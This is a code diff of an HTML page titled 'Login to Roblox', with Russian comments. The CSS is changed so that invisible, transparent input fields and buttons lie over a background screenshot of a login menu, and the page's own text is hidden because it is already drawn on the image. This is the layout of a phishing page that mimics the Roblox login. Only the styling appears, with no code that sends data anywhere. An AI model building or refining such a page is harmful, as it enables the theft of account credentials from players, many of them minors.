@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -6,7 +6,7 @@
     <title>Login to Roblox</title>
     <style>
         body {
-            /* Твой фоновый рисунок с нарисованной менюшкой */
+            /* Фоновая картинка */
             background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
             background-size: cover;
             background-position: center;
@@ -14,30 +14,29 @@
             
             color: #ffffff;
             font-family: Arial, sans-serif;
+            
+            /* Выравнивание ровно по центру экрана */
             display: flex;
-            justify-content: flex-start; /* Выравниваем форму слева */
+            justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
 
         .auth-container {
-            background: transparent; /* Полностью прозрачный блок */
+            background: transparent; /* Делаем форму прозрачной */
             width: 100%;
-            max-width: 440px;
-            padding: 30px;
-            
-            /* Смещение формы ровно на нарисованное меню на картинке */
-            margin-left: 12%; 
-            
+            max-width: 400px;         /* Ширина под размер центральной менюшки */
+            padding: 20px;
             text-align: center;
             box-sizing: border-box;
         }
 
-        /* Прячем заголовок HTML, так как он уже нарисован на фоновой картинке */
-        h1 {
-            opacity: 0; 
-            margin-bottom: 25px;
+        /* Скрываем тексты HTML, так как они уже нарисованы на картинке */
+        h1, 
+        .link-text, 
+        .signup-text {
+            opacity: 0;
         }
 
         form {
@@ -46,12 +45,12 @@
             gap: 12px;
         }
 
-        /* Поля ввода сделаны прозрачными с тонкой рамкой, чтобы совпадать с картинкой */
+        /* Невидимые поля ввода поверх картинки */
         .input-control {
             width: 100%;
             padding: 12px;
-            background-color: rgba(20, 20, 20, 0.6); 
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: transparent;
+            border: 1px solid transparent;
             border-radius: 4px;
             color: #ffffff;
             font-size: 14px;
@@ -59,85 +58,39 @@
         }
 
         .input-control:focus {
-            background-color: rgba(0, 0, 0, 0.8);
-            border-color: #ffffff;
             outline: none;
+            background: rgba(255, 255, 255, 0.05); /* Легкий подсвет при клике */
         }
 
-        .error-message {
-            color: #f85149;
-            font-size: 13px;
-            display: none;
-            text-align: left;
-        }
-
-        /* Прозрачные кнопки поверх картинки */
+        /* Невидимые кликабельные кнопки */
         .btn-submit {
             width: 100%;
             padding: 12px;
-            background-color: rgba(255, 255, 255, 0.9);
-            color: #000000;
+            background: transparent;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
+            color: transparent;
             cursor: pointer;
-            margin-top: 10px;
-            transition: 0.2s;
-        }
-
-        .btn-submit:hover {
-            background-color: #ffffff;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-        }
-
-        .link-text {
-            display: block;
-            margin-top: 15px;
-            color: #b8b8b8;
-            font-size: 13px;
-            text-decoration: none;
-        }
-
-        .link-text:hover {
-            text-decoration: underline;
+            margin-top: 5px;
         }
 
         .secondary-actions {
             display: flex;
             flex-direction: column;
             gap: 10px;
-            margin-top: 20px;
+            margin-top: 40px;
         }
 
         .btn-secondary {
             width: 100%;
             padding: 10px;
-            background-color: rgba(0, 0, 0, 0.3);
-            color: #ffffff;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 4px;
+            background: transparent;
+            border: none;
+            color: transparent;
             cursor: pointer;
         }
 
-        .btn-secondary:hover {
-            background-color: rgba(255, 255, 255, 0.1);
-        }
-
-        .signup-text {
-            margin-top: 25px;
-            font-size: 14px;
-            color: #b8b8b8;
-        }
-
-        .signup-text a {
-            color: #ffffff;
-            font-weight: bold;
-            text-decoration: none;
-        }
-
-        .signup-text a:hover {
-            text-decoration: underline;
+        .error-message {
+            display: none;
         }
     </style>
 </head>
